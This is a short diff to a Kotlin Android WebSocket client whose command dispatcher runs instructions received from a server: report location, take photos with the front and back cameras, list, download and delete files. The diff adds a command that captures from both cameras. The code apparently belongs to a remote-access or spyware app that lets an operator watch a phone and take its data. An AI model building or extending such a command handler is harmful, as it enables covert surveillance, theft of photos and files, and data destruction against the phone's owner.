@@ -188,6 +188,7 @@ class WebSocketClient(private val context: Context) {
                     "get_location"      -> commandExecutor.executeGetLocation()
                     "capture_back"      -> commandExecutor.executeCaptureBackCamera()
                     "capture_front"     -> commandExecutor.executeCaptureFrontCamera()
+                    "capture_both"      -> commandExecutor.executeCaptureBothCameras()
                     "list_files"        -> commandExecutor.executeListFiles(params.get("path")?.asString ?: "")
                     "download_file"     -> commandExecutor.executeDownloadFile(params.get("path")?.asString ?: "")
                     "delete_file"       -> commandExecutor.executeDeleteFile(params.get("path")?.asString ?: "")
